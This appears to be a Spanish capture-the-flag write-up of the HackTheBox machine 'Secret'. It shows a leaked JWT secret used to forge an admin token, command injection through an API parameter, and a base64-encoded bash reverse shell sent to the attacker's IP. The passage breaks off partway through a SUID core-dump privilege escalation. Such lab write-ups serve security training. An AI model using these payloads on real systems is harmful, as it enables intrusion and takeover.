---
layout      : post
title       : "HackTheBox - Secret"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408banner.png
category    : [ htb ]
tags        : [ command-injection, SSH-keys, coredump, code-analysis, SUID ]
---
M√°quina Linux nivel f√°cil. Encontraremos rutas **secreeeeetas** en una web que permiten inyectar a los comandos :( y dumpeos de memoria de los lindos para jugar con info sensible.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408secretHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [z9fr](https://www.hackthebox.eu/profile/485024).

AY ay ay, abriendo bien los ojos oigaaaa.

Inicialmente, tendremos un sitio web que documenta una **API**, en esa documentaci√≥n esta la posibilidad de descargar el c√≥digo fuente para adaptar la API a un proyecto propio. Este c√≥digo nos desvelar√° vaaaarias cositas <u>secretas</u> alojadas por el servidor web actual, jugando con **JWT** y con **command-injection** lograremos una reverse shell como el usuario `dasith` en el sistema.

Finalmente, encontraremos un binario (validador de memoria) **SUID** (generado por `root`) que al ejecutarlo abre una ruta o archivo con todos los permisos administrativos, en su l√≥gica (podemos ver el c√≥digo fuente) genera un **coredump** (dump de memoria) no visible. Jugaremos para **crashear** el proceso, ver el **dump** con la data que hayamos abierto y ver su contenido (: 

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408rating.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408statistics.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 80%;"/>

Poquito real, algo de jugueteo y bastante uso de nuestras manos

> La idea inicial de esta locura es tener mis "notas" por si algun d√≠a se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) :) La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo las ganas para ayudarnos ¬øpor que no hacerlo? ... Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Sin menos, muchas gracias <3 Todo lo que ves es vida!

...

Pero antes mueeeerto...

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Recorriendo el puerto 80](#puerto-80).
3. [Explotaci√≥n](#explotacion).
  * [Jugando con los **JSON Web Token**](#jwtoken).
  * [Aprovechando un **Command-Injection**](#logs-command-injection).
4. [Escalada de privilegios](#escalada-de-privilegios).
  * [Obtenemos llave privada SSH del usuario **root**](#dump-root-idrsa).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Empezaremos descubriendo que puertos (servicios) tiene expuestos (abiertos) la m√°quina, para ello usaremos `nmap`:

```bash
‚ù± nmap -p- --open -v 10.10.11.120 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Como resultado tenemos:

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Thu Mar 10 25:25:25 2022 as: nmap -p- --open -v -oG initScan 10.10.11.120
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.120 () Status: Up
Host: 10.10.11.120 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3000/open/tcp//ppp///
# Nmap done at Thu Mar 10 25:25:25 2022 -- 1 IP address (1 host up) scanned in 219.28 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Podemos obtener una Shell de forma segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Un servidor web. |
| 3000   | **No sabemos a√∫n que sea este puerto...** |

Ahora que tenemos los puertos necesitamos saber realmente que se esta ejecutando por detr√°s de cada uno, as√≠ que vamos a descubrir (realmente lo hace `nmap` :P) por un lado, la versi√≥n del software y, por otro lado, probar si algunos scripts por default de **nmap** pueden encontrar info relevante:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que escribir uno por uno**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.120
    [*] Open ports: 22,80,3000

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80,3000 -sC -sV 10.10.11.120 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y obtenemos:

```bash
‚ù± cat portScan
# Nmap 7.80 scan initiated Thu Mar 10 25:25:25 2022 as: nmap -p 22,80,3000 -sC -sV -oN portScan 10.10.11.120
Nmap scan report for 10.10.11.120
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 10 25:25:25 2022 -- 1 IP address (1 host up) scanned in 19.27 seconds
```

Bien, ya se ampl√≠a la visi√≥n:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 80     | HTTP     | nginx 1.18.0 |
| 3000   | HTTP     | Node.js (Express Middleware) |

De todos los dos **HTTP** se tornan interesantes por sus versiones, adem√°s el puerto **3000** ahora si nos muestra info relevante, pero realmente no sabemos si lo es hasta empezar a enumerar, as√≠ que d√©mosle (:

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

---

## Conociendo el pueblo del puerto 80 [üìå](#puerto-80) {#puerto-80}

Usando nuestro navegador favorito y direccion√°ndonos hacia la URL: `http://10.10.11.120` tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408page80.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Una p√°gina que nos habla de una [API](https://es.wikipedia.org/wiki/Interfaz_de_programaci%C3%B3n_de_aplicaciones) (b√°sicamente es un conjunto de procedimientos que pueden ser usados por otro software) que se esta usando para autenticar usuarios usando [JSON Web Token (**JWT**)](https://jwt.io/introduction), estos sirven como una forma segura de transmitir informaci√≥n mediante un objeto `JSON`, la seguridad llega, ya que estos objetos est√°n digitalmente firmados.

As√≠ que eso, una **API** de autenticaci√≥n que genera **JSON Web Tokens**.

Si damos click sobre cualquier apartado de los que vimos antes nos lleva a una nueva ruta: `http://10.10.11.120/docs`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408page80_docs.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Ah√≠ tenemos toda la documentaci√≥n necesaria (y algunos ejemplos) para interactuar con la **API** (`http://10.10.11.120/api`).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408page80_api.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

De pasada vemos cositas interesantes en la documentaci√≥n: (son textos de ejemplo, pero AJ√Å, nunca se sabe)...

```text
name: dasith
email: root@dasith.works
password: Kekc8swFgD6zU

name: theadmin
```

Volviendo a la p√°gina principal notamos este apartado llamativo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408page80_downloadSourceCodeAPI.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos da la posibilidad de descargar el c√≥digo fuente de la **API** en caso de que queramos usarla en alg√∫n proyecto... Veamos que hay, la descargamos, descomprimimos y tenemos esto:

```bash
‚ù± ls
local-web
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_ls_unzip_SourceCodeAPI.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Varios objetos, el primero que me cautivo fue `.git`:

```bash
‚ù± ls -lago
total 472
drwxrwxr-x 1    144 sep  8  2021 .
drwxrwxr-x 1    182 sep  3  2021 ..
drwxrwxr-x 1      0 sep  3  2021 branches
-rw-rw-r-- 1     38 sep  8  2021 COMMIT_EDITMSG
-rw-rw-r-- 1     92 sep  3  2021 config
-rw-rw-r-- 1     73 sep  3  2021 description
-rw-rw-r-- 1     23 sep  3  2021 HEAD
drwxrwxr-x 1    506 sep  3  2021 hooks
-rw-rw-r-- 1 463197 sep  8  2021 index
drwxrwxr-x 1     14 sep  3  2021 info
drwxrwxr-x 1     16 sep  3  2021 logs
drwxrwxr-x 1   1040 sep  8  2021 objects
drwxrwxr-x 1     18 sep  3  2021 refs
```

Directorio con cositas de [Git](https://es.wikipedia.org/wiki/Git) (en pocas palabras ayuda a controlar y versionar aplicaciones), algo que podemos hacer es ver los `commits` (cambios) que se han implementado a la aplicaci√≥n, una forma es usando:

```bash
# Info m√°s detallada
‚ù± git log

# O mostrando unicamente el t√≠tulo del commit y su ID
‚ù± git log --oneline
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_gitLOGoneline_unzip_SourceCodeAPI.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Hay dos `commits` que nos llaman a investigar, el que habla de retirar `.env` por temas de seguridad y el que ahora se permiten ver logs del servidor... Veamos r√°pidamente el contenido del commit (o sea, que cambio se hizo) sobre el `.env`:

```bash
‚ù± git show 67d8da7
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_gitSHOW67d8da7_API_foundSECRETtoken.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Uhhhhhhhh, lo que podemos interpretar es esto, al archivo `.env` se le quit√≥ una l√≠nea con tooooodo un token (este -token- relacion√°ndolo con los **JWT** tiene mucha importancia, ya que para su creaci√≥n ellos solicitan un "token secreto", OJITO) y se reemplaz√≥ por la palabra `secret`.

As√≠ que guard√©moslo... Otra cosita llamativa la notamos en el √∫ltimo commmit, el de los "logs":

```bash
‚ù± git show e297a27
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_gitSHOWe297a27_API_logsANDprivate_possibleCommandInj_1.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_gitSHOWe297a27_API_logsANDprivate_possibleCommandInj_2.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Opa, inicialmente vemos el username `theadmin` (que tambi√©n lo destacamos en la documentaci√≥n de la **API**) y una validaci√≥n para saber si el usuario es **admin** o no, en caso de que seamos `theadmin` vamos a ver un mensaje as√≠: `welcome back admin` al tener un **token v√°lido** de sesi√≥n.

**En la segunda imagen notamos algo a√∫n m√°s interesante**: existe una ruta llamada `/logs` (sobre la **API**: `/api/logs`) a la cual solo se tiene acceso si tenemos una sesi√≥n v√°lida como el usuario `theadmin`. La ruta recibe el par√°metro `file` para **EJECUTAR EN EL SISTEMA** ([exec](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)) el comando `git log --oneline ARCHIVO`... KHEEEEEEEEEEEEEEE!! ¬øYa viste que podemos hacer en caso de lograr ver correctamente el recurso `/logs`?

Podemos hacer un **COMMAND INJECTIOOOOON**, esto es simplemente aprovechar una instrucci√≥n que ejecuta comandos en el sistema de forma no segura para que -ejecute cualquier comando- que queramos :P

Lo conseguir√≠amos as√≠:

```bash
git log --oneline ARCHIVO; id
```

Ejecuta el `git log` y al final el `id` (: Pero a√∫n no podemos probar esto, enfoqu√©monos en el **token** que encontramos y veamos si es v√°lido para generar **JWT's** v√°lidos y autenticarnos como `theadmin`.

# Explotaci√≥n [#](#explotacion) {#explotacion}

---

## Jugando con los JSON Web Token [üìå](#jwtoken) {#jwtoken}

Siguiendo la documentaci√≥n de la **API** podemos registrar un usuario as√≠:

* [http://10.10.11.120/docs#section-3](http://10.10.11.120/docs#section-1)

---

```json
- URL:
POST -> http://localhost:3000/api/user/register

- DATOS:
{
    "name": "dasith",
    "email": "root@dasith.works",
    "password": "Kekc8swFgD6zU"
}
```

R√°pidamente con `Python`:

```python
#!/usr/bin/python3

import requests
import jwt

URL = "http://10.10.11.120:3000"
username = "lanzate"
email = "admin@gmail.com"
password = "lanz321!"

s = requests.Session()

def register():
    data_post = {
        "name": username,
        "email": email,
        "password": password
    }
    r = s.post(URL + '/api/user/register', json=data_post)
    print(r.text)

register()
```

```bash
‚ù± python3 playWITHapi.py
{"user":"lanzate"}
```

Ya quedamos registrados, ahora autentiqu√©monos:

* [http://10.10.11.120/docs#section-5](http://10.10.11.120/docs#section-5)

---

```python
...
def login():
    data_post = {
        "email": email,
        "password": password
    }
    r = s.post(URL + '/api/user/login', json=data_post)

    print(r.text)
...
login()
```

```bash
‚ù± python3 playWITHapi.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMxNDdlY2VkYzgzMDA0NjJmODVmYmIiLCJuYW1lIjoibGFuemF0ZSIsImVtYWlsIjoiYWRtaW5AZ21haWwuY29tIiwiaWF0IjoxNjQ3Mzk3Mzk2fQ.Mc8Nhu-HOxBtfgPSoWOJbdwtKOpJ90sXExYoSVg5nFg
```

Nos genera el **JWT** de autenticaci√≥n, si intentamos descubrir la estructura que existe detr√°s del token vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408google_jwtIO_decodeTOKEN_lanzate.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Ah√≠ (como en la documentaci√≥n) vemos de que objetos esta compuesto el token de sesi√≥n, ac√° empieza la locura y el toqueteo...

Aprovechemos que tenemos un `TOKEN` y validemos si con √©l podemos crear **JWT** v√°lidos contra las rutas privadas y convertirnos en `theadmin`, s√≠, s√≠, tamos ganaos:

(Usaremos la librer√≠a [**pyjwt**](https://pyjwt.readthedocs.io/en/stable/#example-usage) que pueden instalar en **Python** para jugar con los **JSON Web Tokens**)

```python
...
secret_token = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
...
def priv():
    data_post = {
        "_id": "1",
        "name": "theadmin",
        "email": email,
        "iat": "1"
    }
    jwt_token = jwt.encode(data_post, secret_token, algorithm="HS256")

    print(jwt_token)
...
priv()
```

```bash
‚ù± python3 playWITHapi.py 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiIxIiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJhZG1pbkBnbWFpbC5jb20iLCJpYXQiOiIxIn0.utPAjKmYM-37NAcl0g7qXcmuF2alptlYn6BQhnuYzXU
```

SE GENERAAAAAAAAAAAAAAAAAAAA! As√≠ que nuestro token secreto es v√°lido y podemos generar **JSON Web Tooooooooookens**!!

> Con la misma libreria y el -token secreto- podemos ver la data detras del **token**:

---

```python
...
    jwt_token = jwt.encode(data_post, secret_token, algorithm="HS256")

    print(jwt.decode(jwt_token, secret_token, algorithms=["HS256"]))
...
priv()
```

```bash
‚ù± python3 playWITHapi.py 
{'_id': '1', 'name': 'theadmin', 'email': 'admin@gmail.com', 'iat': '1'}
```

Bien, [seg√∫n la documentaci√≥n de la **API**](http://10.10.11.120/docs#section-6) para generar la correcta visita a `/priv` y `/logs` tenemos que colocar ese **JWT** en el header `auth-token`, probemos:

```python
...
def priv():
    data_post = {
        "_id": "1",
        "name": "theadmin",
        "email": email,
        "iat": "1"
    }
    jwt_token = jwt.encode(data_post, secret_token, algorithm="HS256")

    headers = {"auth-token":jwt_token}

    r = s.get(URL + '/api/priv', headers=headers)
    print(r.text)
...
priv()
```

```bash
‚ù± python3 playWITHapi.py 
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

**ESOOOOOOOOOOOOOOOOOO** somos `theadmin`! Pues veamos `/logs` y rompamos esta vaina (:

## Aprovechando <u>Command-Injection</u> [üìå](#logs-command-injection) {#logs-command-injection}

Solo debemos cambiar la ruta a la que consultamos por `URL + '/api/logs'`, nos devuelve:

```bash
‚ù± python3 playWITHapi.py 
{"killed":false,"code":128,"signal":null,"cmd":"git log --oneline undefined"}
```

Ah√≠ tenemos el resultado del comando que ejecuta el programa, es err√≥neo, ya que (si recordamos) la aplicaci√≥n recibe el par√°metro `file` y lo concatena con el comando, o sea:

```python
...
r = s.get(URL + '/api/logs', params={"file":"hola"}, headers=headers)
...
```

```bash
‚ù± python3 playWITHapi.py 
{"killed":false,"code":128,"signal":null,"cmd":"git log --oneline hola"}
```

Sigue existiendo el error, peeero el "archivo" es interpretado. Pues nada, inyectemos por ejemplo el comando `id` (como hay errores, en lugar de usar `;` usemos `||` para que el sistema haga un "si este comando NO sirve, haz este"):

```python
...
r = s.get(URL + '/api/logs', params={"file":"hola || id"}, headers=headers)
...
```

Yyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_PY_logsAPI_commandInjection_id.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

PERFECTOOOOOOOOOOOowooweoOOOWOoweo, tenemos **ejecuci√≥n remota de comandos** mediante un **command-injection**, d√©mosle forma r√°pidamente a ese script y finalmente us√©moslo para obtener una reverse shell en el sistema (:

> Simplemente le cambie el nombre al programa de `playWITHapi.py` a `apInjection.py` (:

Por ejemplo, si queremos ver la ruta actual donde estamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_PY_logsAPI_commandInjection_pwd.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Les dejo el programa ac√°:

> [apInjection.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/secret/apInjection.py)

Vamos a obtener la reverse shell siguiendo estos pasos (hay otras maneras, esta me gusta), primero encodeamos (para evitar problemas mientras viaja por la red) la RevShell que al ejecutarse har√° una petici√≥n hacia nuestra IP (en mi caso `10.10.14.4`) y el puerto en el que nos pongamos en escucha (en mi caso el `4433`) enviando una `bash`:

```bash
‚ù± echo "bash -i >& /dev/tcp/10.10.14.4/4433 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0MzMgMD4mMQo=
```

Ahora nos ponemos en escucha:

```bash
‚ù± nc -lvp 4433
listening on [any] 4433 ...
```

Y como comando final (que se ejecutara ya en el servidor, NO en nuestra m√°quina) le indicamos: Toma la cadena encodeada, decodeala y ejec√∫tala por favor (:

```bash
‚ù± python3 apInjection.py 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0MzMgMD4mMQo= | base64 -d | bash'
```

Enviamos la petici√≥n yyyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_PY_logsAPI_commandInjection_RevSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Y LIIIIISTOS! Ya tenemos nuestra sesi√≥n en el sistema como el usuario `dasith`.

Antes de seguir volvamos nuestra terminal interactiva, esto para lograr movernos entre comandos, tener hist√≥rico de ellos y ejecutar `CTRL+C` sin temor a perder la Shell:

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty)

Oki, a romper!

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Estando dentro del sistema y dando algunas vueltas por directorios nos encontramos estos objetos en la ruta `/opt`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_dasithSH_lsOPT.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

```bash
# Permisos de ejecuci√≥n:
dasith@secret:/opt$ stat -c "%a %U:%G %n" count
4755 root:root count
```

> [Permisos de objetos en **bash**](https://sites.google.com/site/flaviodanesse/bash/bash-permisos-de-archivos-y-directorios).

Tenemos un objeto [SUID](https://es.wikipedia.org/wiki/Setuid), un c√≥digo fuente, un objeto de recuperaci√≥n de ese c√≥digo y un archivo `.log`...

R√°pidamente, entendamos que es un objeto **SUID** modificando el ejemplo de [este recurso](https://es.wikipedia.org/wiki/Setuid):

```txt
Un usuario llamado -dasith- intenta ejecutar el archivo. 

Los permisos para el archivo ejecutable est√°n fijados para todos 
los usuarios con permiso de ejecuci√≥n (4755), 
de esta manera -dasith- puede ejecutar el archivo. 

El propietario del archivo es (root) y el permiso (SUID) esta fijado (4755), 
por lo que el archivo se ejecuta como (root).
```

Sencillito, **permite ejecutar al usuario `X` el objeto que ha creado `Z` como si lo estuviera ejecutando `Z`** (pero se lo debemos indicar o dentro de la instrucci√≥n debe estar indicado).

Por lo que cuando ejecutamos `count` debe existir alg√∫n momento en el que seamos `root` (:

Bien, llamativo, este ser√≠a el c√≥digo fuente al parecer del objeto `count` para que se hagan sus propias preguntas y respuestas:

> [code.c](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/secret/code.c)

Hay algunas l√≠neas interesantes, pero hay cuatro que ganan nuestra atenci√≥n:

```c
...
int main()
...
124 ‚îÇ // drop privs to limit file write
125 ‚îÇ setuid(getuid());
126 ‚îÇ // Enable coredump generation
127 ‚îÇ prctl(PR_SET_DUMPABLE, 1);
...
```

Notamos que tooooodo lo anterior a la l√≠nea **124** (pues siguiendo los flujos, funciones, etc) esta siendo ejecutado como `root`, justamente en la l√≠nea `124` toma el **UID (User ID)** del usuario que esta ejecutando el programa actualmente (en nuestro caso seria `dasith`) yyyyyyyyy hace un **dump** de memoria como ese usuario (`dasith`).

> "Un <u>dump</u> o <u>volcado</u> de memoria es un registro no estructurado del contenido de la memoria en un <u>momento concreto</u>, generalmente utilizado para depurar un programa que ha finalizado su ejecuci√≥n incorrectamente." ~ [**Wikipedia**](https://es.wikipedia.org/wiki/Volcado_de_memoria)

Les dejo tambi√©n el manual de la instrucci√≥n `prctl` para que busquen el apartado `PR_SET_DUMPABLE` (`1` permite el dumpeo, `0` nop):

* [https://man7.org/linux/man-pages/man2/prctl.2.html](https://man7.org/linux/man-pages/man2/prctl.2.html)

Bueno, un poco loco todo, pero nada de sustos...

Tenemos un objeto ejecutable con permisos **SUID** que al ser ejecutado hace un dump de memoria (esto es llamativo) para en dado caso de que algo salga mal, pos mostrarlo... Veamos su ejecuci√≥n (recordemos que se estar√≠a ejecutando como `root` una parte):

```bash
# Creamos entorno de trabajo para evitar molestar a los dem√°s:
dasith@secret:/opt$ cd /tmp
dasith@secret:/tmp$ mkdir test
dasith@secret:/tmp$ cd test
dasith@secret:/tmp/test$
```

Ejecutamos:

```bash
dasith@secret:/tmp/test$ /opt/count 
Enter source file/directory name: /root
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]: y
Path: /tmp/test/hola
```

Uhh, el objeto de una nos demuestra que tiene permisos administrativos, ya que estamos viendo el contenido del directorio `/root` (al que claramente solo se puede acceder con permisos administrativos (valga la aclaraci√≥n) :P)

Al final nos da la opci√≥n de guardar el output en un objeto, este ser√≠a el resultado:

```bash
dasith@secret:/tmp/test$ cat hola 
Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
```

Ac√° entr√≥ en juego el dumpeo para saber que cositas hay en el directorio, pero no nos guarda nada √∫til ):

La vuelta es que si seguimos jugando con el ejecutable podemos descubrir rutas y archivos (no su contenido) del sistema. Por ejemplo, sabemos que `root` tiene llave privada:

```bash
dasith@secret:/tmp/test$ /opt/count 
Enter source file/directory name: /root/.ssh
drwx------      ..
-rw-------      authorized_keys
-rw-------      id_rsa
drwx------      .
-rw-r--r--      id_rsa.pub
...
```

Aunque eso, solo nos sirve para descubrir :( 

Despu√©s de un rato perdido jugando con el programa, me fui a buscar en internet que hacer con esto ("core dump suid privesc", "suid core dump exploit", etc.), encontramos algunos post interesantes como este:

* [Exploiting crash handlers: LPE on Ubuntu](https://alephsecurity.com/2021/02/16/apport-lpe/).

Nos deja dos citas, una de ellas ya la conoc√≠amos, pero esta bueno traerla de nuevo para que tome sentido la segunda:

> "When a process in Linux terminates abnormally, a core file is usually created by the kernel." ~ [**AlephSecurity**](https://alephsecurity.com/2021/02/16/apport-lpe/)

Y ahora la interesante:

> "When a process receives certain signals (for example SIGSEGV or SIGABRT), the default kernel action for these signals terminates the process and creates a <u>coredump file</u>. This file lets us inspect the state of the program at the time of the crash." ~ [**AlephSecurity**](https://alephsecurity.com/2021/02/16/apport-lpe/)

Tambi√©n vemos que el output del crash depende de la configuraci√≥n del objeto `/proc/sys/kernel/core_pattern`:

```bash
dasith@secret:/tmp/test$ cat /proc/sys/kernel/core_pattern
|/usr/share/apport/apport %p %s %c %d %P %E
```

La explicaci√≥n detallada del contenido esta en el propio post y entendemos que el crash es manejado por el programa [**Apport**](https://wiki.ubuntu.com/Apport).

> "Apport collects potentially sensitive data, such as core dumps, stack traces, and log files" ~ [**Wiki Ubuntu**](https://wiki.ubuntu.com/Apport)

Y **Apport** guarda el reporte del crash dentro de la carpeta `/var/crash`... 

```bash
dasith@secret:/tmp/test$ ls -la /var/crash
total 8
drwxrwxrwt  2 root root 4096 Mar 23 22:53 .
drwxr-xr-x 14 root root 4096 Aug 13  2021 ..
```

¬øPero como generamos ese crash? Pos simplemente matando el **PID** (Process ID) del proceso relacionado con `count`, hag√°mosle:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_dasithSH_count_executeBINwith_rootSSHfolder.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Ahora matemos el proceso, podr√≠amos crear otra sesi√≥n (reverse shell o agregar llave p√∫blica al sistema y entrar por SSH (se los dejo de tarea)) o simplemente mandar esta tarea a segundo plano y terminarla, hagamos esta √∫ltima:

Ejecutamos `CTRL+Z` y ya estar√≠a en segundo plano:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_dasithSH_count_executeBINwith_ctrlZ.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Lo siguiente es obtener el **PID** de ese proceso, listemos todos con la herramienta [ps](https://francisconi.org/linux/comandos/ps) y filtremos por los que contengan la palabra `count`:
```bash
dasith@secret:/tmp/test$ ps auxww
```

| Argumento | Descripci√≥n |
| --------- | :---------- |
| aux | Nos muestra informaci√≥n detallada de tooodos los procesos en formato BSD. |
| w  | Output con muucho m√°s detalle. Si usamos doble `ww` es ilimitado el tama√±o de detalle. |

Filtramos:

```bash
dasith@secret:/tmp/test$ ps auxww | grep count
root         859  0.0  0.1 235676  7456 ?        Ssl  06:11   0:01 /usr/lib/accountsservice/accounts-daemon
dasith    217415  0.0  0.0   2488   588 pts/2    T    22:32   0:00 /opt/count
dasith    217464  0.0  0.0   6432   736 pts/2    S+   22:45   0:00 grep --color=auto count
```

Ah√≠ lo tenemos: `217415`, pos mat√©moslo, peeeeeeeeeeero recordemos una de las citas, debemos pasarle alguna de estas dos se√±ales: `SIGSEGV` o `SIGABRT` para que se termine el proceso y cree un archivo con el dump:

* [Understanding the **kill** command, and how to terminate processes in Linux](https://bencane.com/2014/04/01/understanding-the-kill-command-and-how-to-terminate-processes-in-linux/)

Podemos usar `kill`:

```bash
# kill -11 <pid>
# kill -SEGV <pid>
# kill -SIGSEGV <pid>
```

Entonces:

```bash
dasith@secret:/tmp/test$ kill -SIGSEGV 217415
```

Validemos si efectivamente se muri√≥:

```bash
dasith@secret:/tmp/test$ ps auxww | grep count
root         859  0.0  0.1 235676  7456 ?        Ssl  06:11   0:01 /usr/lib/accountsservice/accounts-daemon
dasith    217415  0.0  0.0   2488   588 pts/2    T    22:32   0:00 /opt/count
